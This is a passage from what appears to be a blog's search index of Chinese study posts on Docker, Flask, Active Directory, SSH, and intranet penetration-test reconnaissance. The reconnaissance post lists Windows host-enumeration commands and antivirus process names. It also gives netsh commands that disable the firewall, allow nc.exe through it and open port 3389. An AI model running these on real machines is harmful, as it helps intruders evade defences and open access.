&#x2F;usr&#x2F;share&#x2F;gitdir&#x2F;\n\n然后就可以利用Dockerfile结合build命令构建镜像了：\ndocker build -t&#x3D;&quot;xianhu&#x2F;centos:gitdir&quot; .\n-t用来指定新镜像的用户信息、tag等，\n.表示从当前目录寻找Dockerfile\n\n删除镜像如果想删除容器或者镜像，可以使用rm命令，注意：删除镜像前必须先删除以此镜像为基础的容器。\n[root@xxx ~]# docker rm container_name&#x2F;container_id\n[root@xxx ~]# docker rmi image_name&#x2F;image_id\n\n保存镜像[root@xxx ~]# docker save -o centos.tar a1andns&#x2F;centos:git    # 保存镜像, -o也可以是--output\n\n加载镜像[root@xxx ~]# docker load -i centos.tar    # 加载镜像, -i也可以是--input\n\nDocker中关于容器的基本操作基于镜像启动一个容器，即docker run操作。\n[root@xxx ~]# docker run -it centos:latest &#x2F;bin&#x2F;bash\n\n这里-it是两个参数：-i和-t。前者表示打开并保持stdout，后者表示分配一个终端（pseudo-tty）。此时如果使用exit退出，则容器的状态处于Exit，而不是后台运行。如果想让容器一直运行，而不是停止，可以使用快捷键 ctrl+p ctrl+q 退出，此时容器的状态为Up。\n[root@xxx ~]# docker run -d centos:latest &#x2F;bin&#x2F;bash -c &quot;while true; do echo hello; sleep 1; done&quot;\n\n后台运行-d，使这个容器处于后台运行的状态，不会对当前终端产生任何输出，所有的stdout都输出到log，可以使用docker logs container_name/container_id查看。\n启动、停止、重启容器命令[root@xxx ~]# docker start container_name&#x2F;container_id\n[root@xxx ~]# docker stop container_name&#x2F;container_id\n[root@xxx ~]# docker restart container_name&#x2F;container_id\n\n进入到后台容器[root@xxx ~]# docker attach container_name&#x2F;container_id\n\n删除容器[root@xxx ~]# docker rm container_name&#x2F;container_id\n\nDocker中关于仓库的基本操作Docker官方维护了一个DockerHub的公共仓库，里边包含有很多平时用的较多的镜像。除了从上边下载镜像之外，我们也可以将自己自定义的镜像发布（push）到DockerHub上。\n（1）访问https://hub.docker.com/，如果没有账号，需要先注册一个。\n（2）利用命令docker login登录DockerHub，输入用户名、密码即可登录成功：\n[root@xxx ~]# docker login\nLogin with your Docker ID to push and pull images from Docker Hub. If you don&#39;t have a Docker ID, head over to https:&#x2F;&#x2F;hub.docker.com to create one.\nUsername: a1andns\nPassword:\nLogin Succeeded\n\n3）将本地的镜像推送到DockerHub上，这里的a1andns要和登录时的username一致：\n[root@xxx ~]# docker push a1andns&#x2F;centos:git    # 成功推送\n[root@xxx ~]# docker push xxx&#x2F;centos:git    # 失败\nThe push refers to a repository [docker.io&#x2F;xxx&#x2F;centos]\nunauthorized: authentication required\n\n（4）以后别人就可以从你的仓库中下载合适的镜像了。\n[root@xxx ~]# docker pull a1andns&#x2F;centos:git\n\n对应于镜像的两种创建方法，镜像的更新也有两种：\n\n创建容器之6后做更改，之后commit生成镜像，然后push到仓库中。\n更新Dockerfile。在工作时一般建议这种方式，更简洁明了。\n\n参考材料[1] https://zhuanlan.zhihu.com/p/23599229\n","slug":"Docker简单入门","date":"2021-01-21T05:36:40.000Z","categories_index":"Docker","tags_index":"Dcoker","author_index":"A1andNS"},{"id":"820f7da9564f9f0694c65c741a3b8b11","title":"内网信息收集","content":"考试结束，继续学习。\n内网信息收集概述3个要点：对当前机器角色的判断、对当前机器所处环境的拓扑进行分析和判断、对当前机器所处区域的判断。\n角色例如：Web服务器、开发测试服务器、代理服务器、DNS服务器、文件服务器等。\n拓扑：大致的内网拓扑结构图。\n区域例如：DMZ、办公区、核心区等。\n本机信息收集通过收集信息来给机器画像。\n手动信息收集本机信息包括操作系统、权限、内网IP地址段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机很多东西都是批量安装的。\n通过一台主机的信息来举一反三推测规律。\n1.  查询网络配置信息大家都很熟悉的ipconfig /all\n2. 查询操作系统及软件的信息（1）查询操作系统和版本信息\nsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;\n如果是中文版操作系统则是使用\nsysteminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;\n注意：只有在CMD中才能使用，powershell是没有输出的。\n（2）查看系统体系架构\necho %PROCESSOR_ARCHITECTURE%\n注意：只有在CMD中才能使用，powershell是没有输出的。\n（3）查看安装的软件及版本、路径等\n利用wmic命令，将结果输出到文本文件中。\n\n\n\n\n\n\n\n\n\nWMIC(Windows Management InstrumentationCommand Line),也就是Windows管理器命令行。这是除了cmd和powershell外的一款Windows的强大shell，以wmic开头使用。\nwmic product get name,version\nC:\\Users\\test&gt;wmic product get name,version\nName                                                            Version\nVMware Tools                                                    11.1.5.16724464\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127  14.24.28127\nMicrosoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127  14.24.28127\nMicrosoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127     14.24.28127\nMicrosoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127     14.24.28127\n\n利用powershell命令，收集软件的版本信息。\npowershell \"Get-WmiObject -class Win32_Product | Select-Object -Property name,version\"\n\nPS C:\\Users\\test\\Desktop> powershell \"Get-WmiObject -class Win32_Product | Select-Object -Property name,version\"\n\nname                                                           version\n----                                                           -------\nVMware Tools                                                   11.1.5.16724464\nMicrosoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127 14.24.28127\nMicrosoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127 14.24.28127\nMicrosoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127    14.24.28127\nMicrosoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127    14.24.28127\n\n3. 查询本地服务信息vmic service list brief\n\nPS C:\\Users\\test\\Desktop> wmic service list brief\nExitCode  Name                                      ProcessId  StartMode  State    Status\n1077      AJRouter                                  0          Manual     Stopped  OK\n1077      ALG                                       0          Manual     Stopped  OK\n1077      AppIDSvc                                  0          Manual     Stopped  OK\n1077      Appinfo                                   0          Manual     Stopped  OK\n1077      AppMgmt                                   0          Manual     Stopped  OK\n1077      AppReadiness                              0          Manual     Stopped  OK\n                                    (省略)\n\n4. 查询进程列表查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀毒软件等进程\ntasklist\n使用wmic来查看进程信息：\nwmic process list brief\n\nPS C:\\Users\\test\\Desktop> wmic process list brief\nHandleCount  Name                         Priority  ProcessId  ThreadCount  WorkingSetSize\n0            System Idle Process          0         0          2            8192\n2066         System                       8         4          115          0\n0            Registry                     8         92         4            802816\n53           smss.exe                     11        304        2            0\n380          csrss.exe                    13        424        10           184320\n159          wininit.exe                  13        528        1            0\n369          csrss.exe                    13        536        11           761856\n                                         (省略)\n\n常见杀毒软件进程名：\n\n\n\n进程名\n软件名\n\n\n\n360tray.exe\n360安全卫士\n\n\n360sd.exe\n360杀毒\n\n\na2guard.exe\na-squared杀毒\n\n\nad-watch.exe\nLavasoft杀毒\n\n\ncleaner8.exe\nThe Cleaner杀毒\n\n\nvba32lder.exe\nvb32杀毒\n\n\nMongoosaGUI.exe\nMongoosa杀毒\n\n\nCorantiControlCenter32.exe\nCoranti2012杀毒\n\n\nF-PROT.EXE\nF-PROT杀毒\n\n\nCMCTrayIcon.exe\nCMC杀毒\n\n\nK7TSecurity.exe\nK7杀毒\n\n\nUnThreat.exe\nUnThreat杀毒\n\n\nCKSoftShiedAntivirus4.exe\nShield Antivirus杀毒\n\n\nAVWatchService.exe\nVIRUSfighter杀毒\n\n\nArcaTasksService.exe\nArcaVir杀毒\n\n\niptray.exe\nImmunet杀毒\n\n\nPSafeSysTray.exe\nPSafe杀毒\n\n\nnspupsvc.exe\nnProtect杀毒\n\n\nSpywareTerminatorShield.exe\nSpywareTerminator杀毒\n\n\nBKavService.exe\nBkav杀毒\n\n\nMsMpEng.exe\nMicrosoft Security Essentials\n\n\nSBAMSvc.exe\nVIPRE\n\n\nccSvcHst.exe\nNorton杀毒\n\n\nQQ.exe\nQQ\n\n\nf-secure.exe\n冰岛\n\n\navp.exe\n卡巴斯基\n\n\nKvMonXP.exe\n江民杀毒\n\n\nRavMonD.exe\n瑞星杀毒\n\n\nMcshield.exe\n“麦咖啡\n\n\negui.exe\nNOD32\n\n\nkxetray.exe\n金山毒霸\n\n\nknsdtray.exe\n“可牛杀毒\n\n\navcenter.exe\n“Avira(小红伞)\n\n\nashDisp.exe\nAvast网络安全\n\n\nrtvscan.exe\n诺顿杀毒\n\n\nksafe.exe\n金山卫士\n\n\nQQPCRTP.exe\nQQ电脑管家\n\n\nMiner.exe\n流量矿石\n\n\nAYAgent.aye\n韩国胶囊\n\n\npatray.exe\n安博士\n\n\nV3Svc.exe\n安博士V3\n\n\navgwdsvc.exe\nAVG杀毒\n\n\nccSetMgr.exe\n赛门铁克\n\n\nQUHLPSVC.EXE\nQUICK HEAL杀毒\n\n\nmssecess.exe\n微软杀毒\n\n\nSavProgress.exe\nSophos杀毒\n\n\nfsavgui.exe\nF-Secure杀毒\n\n\nvsserv.exe\n比特梵德\n\n\nremupd.exe\n熊猫卫士\n\n\nFortiTray.exe\n飞塔\n\n\nsafedog.exe\n安全狗\n\n\nparmor.exe\n木马克星\n\n\nbeikesan.exe\n贝壳云安全\n\n\nKSWebShield.exe\n金山网盾\n\n\nTrojanHunter.exe\n木马猎手\n\n\nGG.exe\n巨盾网游安全盾\n\n\nadam.exe\n绿鹰安全精灵\n\n\nAST.exe\n超级巡警\n\n\nananwidget.exe\n墨者安全专家\n\n\nAVK.exe\nGData\n\n\nccapp.exe\nSymantec Norton\n\n\navg.exe\nAVG Anti-Virus\n\n\nspidernt.exe\nDr.web\n\n\nMcshield.exe\nMcafee\n\n\navgaurd.exe\nAvira Antivir\n\n\nF-PROT.exe\nF-Prot AntiVirus\n\n\nvsmon.exe\nZoneAlarm\n\n\navp.exee\nKaspersky\n\n\ncpf.exe\nComodo\n\n\noutpost.exe\nOutpost Firewall\n\n\nrfwmain.exe\n瑞星防火墙\n\n\nkpfwtray.exe\n金山网镖\n\n\nFYFireWall.exe\n风云防火墙\n\n\nMPMon.exe\n微点主动防御\n\n\npfw.exe\n天网防火墙\n\n\nS.exe\n在抓鸡\n\n\n1433.exe\n在扫1433\n\n\nDUB.exe\n在爆破\n\n\nServUDaemon.exe\n发现S-U\n\n\nBaiduSdSvc.exe\n百度杀软\n\n\n5. 查看启动程序信息执行如下命令，查看启动程序信息。  \nwmic startup get command,caption\n\nPS C:\\Users\\test\\Desktop&gt; wmic startup get command,caption\nCaption                     Command\nOneDrive                    &quot;C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe&quot; &#x2F;background\nSecurityHealth              %windir%\\system32\\SecurityHealthSystray.exe\nVMware VM3DService Process  &quot;C:\\Windows\\system32\\vm3dservice.exe&quot; -u\nVMware User Process         &quot;C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe&quot; -n vmusr\n\n6. 查看计划任务schtasks /query /fo /LIST /v 查询所有计划任务并且格式化输出还显示详细任务输出。\n7. 查看主机开机时间net statistics workstation查看主机开机时间。\n8. 查询用户列表net user通过分析本机用户列表，我们可以找出内网机器的命名规则。特别是个人机器的名称，可以用来推测整个域的用户名的命名方式。\n查询本地管理员信息，本地管理员通常是包括域用户的。\nnet localgroup administrators默认Domain Admins组中为域内机器的本地管理员用户。在真实环境中，为了方便管理，会有域用户被添加为域机器的本地管理用户，所以可以通过这里面的信息来推测。\n查询当前在线用户\nquery user || qwinsta\n9. 列出或断开本地计算机域所连接的客户端之间的会话net session查看会话\n10. 查看端口列表查看端口列表、本机开放的端口所对应的服务和应用程序。\nnetstat -ano可以查看当前机器和哪些主机建立了连接，以及TCP、UDP等端口的使用和监听情况。通过端口的开放情况来推测服务器的可能类型。\n11. 查看补丁列表systeminfo用于查看系统信息，在修补程序中可以看到补丁列表。\n使用wmic命令来查看wmic qfe get Caption,Description,HotFixID,InstalledOn\nC:\\Users\\test&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn\nCaption                                     Description      HotFixID   InstalledOn\nhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;4534170  Update           KB4534170  4&#x2F;20&#x2F;2020\nhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;4537759  Security Update  KB4537759  4&#x2F;20&#x2F;2020\nhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;4545706  Security Update  KB4545706  4&#x2F;20&#x2F;2020\nhttp:&#x2F;&#x2F;support.microsoft.com&#x2F;?kbid&#x3D;4558244  Update           KB4558244  4&#x2F;20&#x2F;2020\n\n补丁的名称，描述，ID，安装时间都可以查询得到。\n12. 查询本机共享列表net share是用来查看本机共享列表和可访问的域共享列表。\n利用wmic命令来查找共享列表wmic share get name,path,status\n13. 查询路由表以及所有可用接口的ARP缓存表route print\narp -a\n\n14.查询防火墙相关配置(1)关闭防火墙\nWindows Server 2003之前版本：\nnetsh firewall set opmode disable\nWindows Server 2003之后版本：\nnetsh advfirewall set allprofiles state off\n\n(2) 查看防火墙配置\nnetsh firewall show config\n(3)修改防火墙配置\nWindows Server 2003及之前版本允许指定程序全连接：\nnetsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable\nWdinows Server 2003之后的版本：\n允许指定程序进入：\nnetsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;\n允许指定程序退出：\nnetsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\\nc.exe&quot;\n允许3389端口放行：\nnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localhost=3389 action=allow\n自定义防火墙日志的存储位置：\nnetsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot;\n15. 查看代理配置情况reg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;\n\n","slug":"内网信息收集","date":"2021-01-18T11:39:46.000Z","categories_index":"网络安全","tags_index":"内网","author_index":"A1andNS"},{"id":"c534e964ea88346a47f1aade8aec7790","title":"Flask框架学习(一)","content":"基础知识什么是Web Framework？Web Application Framework（Web应用程序框架）或简单的Web Framework（Web框架）表示一个库和模块的集合，使Web应用程序开发人员能够编写应用程序，而不必担心协议，线程管理等低级细节。\n什么是Flask？Flask是一个用Python编写的Web应用程序框架。 它由 Armin Ronacher 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。\nWSGIWeb Server Gateway Interface（Web服务器网关接口，WSGI）已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。\nWerkzeug它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。\njinja2jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。\nFlask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。一些受欢迎的Flask扩展将在本教程后续章节进行讨论。\n关键搭建关于Flask环境的搭建，安装Flask通常需要Python 2.6或更高版本。虽然Flask及其依赖项适用于Python 3（Python 3.3以上版本），但是许多Flask扩展不能正确支持它。因此，建议在Python 2.7上安装Flask。\n一般可以使用两种，一种是安装虚拟python环境virtualenv，然后使用虚拟环境，另外一种就是使用本机python环境来搭建，然后关键就是需要使用pip来安装Flask模块。\npip install Flask\n\n","slug":"Flask框架学习-一","date":"2021-01-04T14:49:32.000Z","categories_index":"Python","tags_index":"Flask","author_index":"A1andNS"},{"id":"14977c855246b370eca085704beb99ef","title":"内网渗透基础知识","content":"最近在看《内网安全攻防》，做个小笔记，已备查看。\n内网的概述内网也指局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的历程安排、电子邮件和传真通信服务等功能。可以大可以小，具体看这个组织的大小了。当然在这种局域网的概念中又可以分为安全等级更高的内网、DMZ区(隔离区)、和外网。我个人认为内网可能有广义和狭义的两种，广义上可以理解为是局域网，狭义上可能是更加细分的局域网中的不对外开放的内网区域。\n工作组简介工作组（Work Group），在一个大的单位内，对一个局域网内的计算机进行分组。如技术部的电脑都列入“技术部”工作组中，行政部的电脑都列入“行政部”工作组中。你要访问某个部门的资源，就在“网络”里找到那个部门的工作组名，双击就可以看到那个部门的所有电脑了。相比不分组的情况就有序的多了，尤其是对于大型局域网络来说。\n加入/创建/退出工作组右击桌面上的“计算机”，在弹出的菜单出选择“属性”，点击“更改设置”，“更改”，在“计算机名”一栏中键入你想好的名称，在“工作组”一栏中键入你想加入的工作组名称。如果你输入的工作组名称网络中没有，那么相当于新建了一个工作组，当然暂时只有你的电脑在组内。单击“确定”按钮后，Windows提示需要重新启动，重新启动之后，再进入“网络”就可以看到你所加入的工作组成员了。\n退出同理，修改工作组名称即可退出。\n工作组的不足之处工作组的不足之处就是如果管理员想要可以访问所有工作组中的电脑，那就需要创建n个相同账号，n为电脑台数。这样的话如果n很大，那么管理员也太惨了。\n域域(Domain)是一个有安全边界的计算机集合（安全边界意思是在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单的把域理解成升级版的“工作组”，相比工作组而言,它有一个更加严格的安全管理控制机制,如果你想访问域内的资源,必须拥有一个合法的身份登陆到该域中,而你对该域内的资源拥有什么样的权限,还需要取决于你在该域中的用户身份。\n组织单元OU在域中，一个组织单元OU是把对象组织成逻辑管理组的容器，其中包括一个或多个对象，如用户账号、组、计算机、打印机、应用、文件共享或其他OU等。\n单域在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的，所以提高了可靠性。\n父域和子域出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。\n比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）\n还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。\n域树域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系(Trust Relation)。\n信任关系是连接在域与域之间的桥梁。域树内的父域与子域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。\n在一个域树中，父域可以包含很多子域，子域是相对父域来说的，指域名中的每一个段。子域只能使用父域作为域名的后缀，也就是说在一个域树中，域的名字是连续的。最后就会出现一个树形结构的结构，比较像数据结构中的树。\n\n域森林域森林指若干个域树通过建立信任关系组成的集合。可以通过域树之间建立的信任关系来管理和使用整个森林中的资源，从而又保持了原有域自身原有的特性。\n\nDNS域名服务器DNS域名服务器（Domain Name Server）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。\n在域树的介绍中，可以看到域树中的域的名字和DNS域的名字非常相似，实际上域的名字就是DNS域的名字，因为域中的计算机使用DNS来定位域控制器和服务器以及其他计算机、网络服务等。\n一般情况下,我们在内网渗透时就通过寻找DNS服务器来定位域控制器，因为通常DNS服务器和域控制器会处在同一台机器上。\n活动目录活动目录（Active Directory）是域环境中提供目录服务的组件。\n目录就是存储有关网络对象（如用户、组、计算机、共享资源、打印机和联系人等）的信息。目录服务是帮助用户快速准确的从目录中查找到他所需要的信息的服务。活动目录存储的是网络中所有资源的快捷方式，用户通过寻找快捷方式而定位资源。\n逻辑结构在活动目录中（Active Directory），管理员可以完全忽略被管理对象的具体地理位置，而将这些对象按照一定的方式放置在不同的容器中。由于这种组织对象的做法不考虑被管理对象的具体地理位置，这种组织框架称为“逻辑结构”。\n活动目录的逻辑结构就包括上面讲到的组织单元（OU）、域（domain）、域树（tree）、域森林（forest）。在域树内的所有域共享一个活动目录，这个活动目录内的数据分散地存储在各个域内，且每一个域只存储该域内的数据。\n活动目录的主要功能\n帐号集中管理，所有帐号均存在服务器上,方便对帐号的重命令/重置密码。\n软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件,可以让用户自由选择安装软件。\n环境集中管理，利用AD可以统一客户端桌面,IE,TCP/IP等设置。\n增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。\n更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，宕机时间更少。\n活动目录为Microsoft统一管理的基础平台，其它isa,exchange,sms等服务都依赖于这个基础平台。\n\nAD与DC的区别如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。\n那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。\n搭载了AD库的服务器就是DC了，有了DC后，我们只需要在DC上创建账户就可以访问管理所有的域内计算机了。\n安全域划分安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。\n\nDMZ区域简介DMZ称为“隔离区”，也称“非军事化区”。是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。这个缓冲区位于企业内部网络和外部网络之间的小网络区域内，在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络，因为这种网络部署，比起一般的防火墙方案，对攻击者来说又多了一道关卡。\nDMZ的屏障功能\n内网可以访问外网：内网的用户需要自由地访问外网。在这一策略中，防火墙需要执行NAT。\n内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器。\n外网不能访问内网：这是防火墙的基本策略了，内网中存放的是公司内部数据，显然这些数据是不允许外网的用户进行访问的。如果要访问，就要通过VPN方式来进行。\n外网可以访问DMZ：DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。\nDMZ不能访问内网：如不执行此策略，则当入侵者攻陷DMZ时，内部网络将不会受保护。　\nDMZ不能访问外网：此条策略也有例外，比如我们的例子中，在DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。\n\n域中计算机分类\n域控制器\n成员服务器\n客户机\n独立服务器\n\n域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。\n域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。\n同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。\n域内权限解读组组（Group）是用户帐号的集合。通过向一组用户分配权限从而不必向每个用户分配权限，管理员在日常工作中不必要去为单个用户帐号设置自己独特的访问权限，而是将用户帐号加入到相对应的安全组中。管理员通过给相对的安全组访问权限就可以了，这样所有加入到安全组的用户帐号都将有同样的权限。使用安全组而不是单个的用户帐号可以方便，简化网络的维护和管理工作。\n域本地组域本地组，多域用户访问单域资源（访问同一个域）。可以从任何域添加用户账户、通用组和全局组，只能在其所在域内指派权限。域本地组不能嵌套于其他组中。它主要是用于授予位于本域资源的访问权限。\n全局组全局组，单域用户访问多域资源（必须是同一个域里面的用户）。只能在创建该全局组的域上进行添加用户和全局组，可以在域林中的任何域中指派权限，全局组可以嵌套在其他组中。\n通用组通用组，通用组成员来自域林中任何域中的用户账户、全局组和其他的通用组，可以在该域林中的任何域中指派权限，可以嵌套于其他域组中。非常适于域林中的跨域访问。\n可以简单这样记忆：\n\n域本地组：来自全林用于本域\n全局组：来自本域用于全林\n通用组：来自全林用于全林\n\nA-G-DL-P策略\nA(account)，表示用户账号\nG(Global group)，表示全局组\nU(Universal group)，表示通用组\nDL(Domain local group)，表示域本地组\nP(Permission 许可)，表示资源权限。\n\nA-G-DL-P策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。按照AGDLP的原则对用户进行组织和管理起来更容易。在AGDLP形成以后,当给一个用户某一个权限的时候,只要把这个用户加入到某一个本地域组就可以了。\n\n本地域组的权限本地域组的权限\nAdministrators（管理员组）\nRemote Desktop Users(远程登录组)\nPrint Operators（打印机操作员组）\nAccount Operators（帐号操作员组）\nServer Operaters（服务器操作员组）\nBackup Operators（备份操作员组）\n\n全局组、通用组的权限\nDomain Admins（域管理员组）\nEnterprise Admins（企业系统管理员组）\nSchema Admins（架构管理员组）\nDomain Users（域用户组）\n\n参考资料《内网安全攻防：渗透测试指南》\n","slug":"内网渗透基础知识","date":"2021-01-03T12:49:27.000Z","categories_index":"网络安全","tags_index":"内网","author_index":"A1andNS"},{"id":"86329bd862265de73cba866bd39449ad","title":"Redhat学习(六)","content":"Linux远程管理中经常使用的SSH，也就是对应的sshd服务。\n远程控制服务SSH（Secure Shell）是一种能够以安全的方式提供远程登录的协议，也是目前远程管理Linux系统的首选方式。在此之前，一般使用FTP或Telnet来进行远程登录。但是因为它们以明文的形式在网络中传输账户密码和数据信息，因此很不安全，很容易受到黑客发起的中间人攻击，这轻则篡改传输的数据信息，重则直接抓取服务器的账户密码。\n想要使用SSH协议来远程管理Linux系统，则需要部署配置sshd服务程序。sshd是基于SSH协议开发的一款远程管理服务程序，不仅使用起来方便快捷，而且能够提供两种安全验证的方法：\n\n\n\n\n\n\n\n\n\n基于口令的验证—用账户和密码来验证登录；\n基于密钥的验证—需要在本地生成密钥对，然后把密钥对中的公钥上传至服务器，并与服务器中的公钥进行比较；该方式相较来说更安全。\n sshd服务配置文件中包含的参数以及作用\n\n\n\n参数\n作用\n\n\n\nPort 22\n默认的sshd服务端口\n\n\nListenAddress 0.0.0.0\n设定sshd服务器监听的IP地址\n\n\nProtocol 2\nSSH协议的版本号\n\n\nHostKey /tc/ssh/ssh_host_key\nSSH协议版本为1时，DES私钥存放的位置\n\n\nHostKey /etc/ssh/ssh_host_rsa_key\nSSH协议版本为2时，RSA私钥存放的位置\n\n\nHostKey /etc/ssh/ssh_host_dsa_key\nSSH协议版本为2时，DSA私钥存放的位置\n\n\nPermitRootLogin yes\n设定是否允许root管理员直接登录\n\n\nStrictModes yes\n当远程用户的私钥改变时直接拒绝连接\n\n\nMaxAuthTries 6\n最大密码尝试次数\n\n\nMaxSessions 10\n最大终端数\n\n\nPasswordAuthentication yes\n是否允许密码验证\n\n\nPermitEmptyPasswords no\n是否允许空密码登录（很不安全）\n\n\n通过修改ssh服务的配置文件，我们可以实现对ssh服务功能的配置和管理，这个确实是Linux一切皆为文件。同时Linux下的文件配置修改后，并不会马上生效，至少大多数服务都是如此，故而很多时候都需要重启服务才能实现服务配置的更新。\nssh登陆中的密码登陆大家都很熟悉了就不多说了，看看安全密钥验证方式，也就是ssh key\n安全密钥验证加密是对信息进行编码和解码的技术，它通过一定的算法（密钥）将原本可以直接阅读的明文信息转换成密文形式。密钥即是密文的钥匙，有私钥和公钥之分。在传输数据时，如果担心被他人监听或截获，就可以在传输前先使用公钥对数据加密处理，然后再行传送。这样，只有掌握私钥的用户才能解密这段数据，除此之外的其他人即便截获了数据，一般也很难将其破译为明文信息。\n这里的主要实现方式就是在客户端生成ssh密钥，然后部署到服务端。\n\n在我们的客户端上使用ssh-keygen命令来生成密钥，这个应该大家都干过了，至少搭建过github博客肯定用过。\n然后就是把生成的公钥文件传送到远程主机（服务端），使用ssh-copy-id 目标IP来实现。\n至于要不要不允许使用密码登陆，就可以根据情况了，如果明显只有你一个人使用，那就可以关闭密码验证登陆方式，但是这个就要确保你生成公钥设备的可用性了，毕竟就它可以连上去。\n\n远程传输命令scp（secure copy）是一个基于SSH协议在网络之间进行安全传输的命令，其格式为“scp [参数] 本地文件 远程帐户@远程IP地址:远程目录”。\n这个命令很是重要，在AWD比赛中，ssh一般用来连接靶机，而这个scp命令则是备份文件到本地，和传送文件到靶机。\n scp命令中可用的参数及作用\n\n\n\n参数\n作用\n\n\n\n-v\n显示详细的连接进度\n\n\n-P\n指定远程主机的sshd端口号\n\n\n-r\n用于传送文件夹\n\n\n-6\n使用IPv6协议\n\n\nscp -r &#x2F;var&#x2F;www&#x2F;html A1andNS@192.168.40.3:&#x2F;home&#x2F;a1andns&#x2F;Desktop\n\n这里回要求输入密码进行验证，但是如果已经设置了安全密钥验证，那么上传文件到服务端就不需要密码验证了，因为本身就是基于ssh的。\n还可以使用scp命令把远程主机上的文件下载到本地主机，其命令格式为“scp [参数] 远程用户@远程IP地址:远程文件 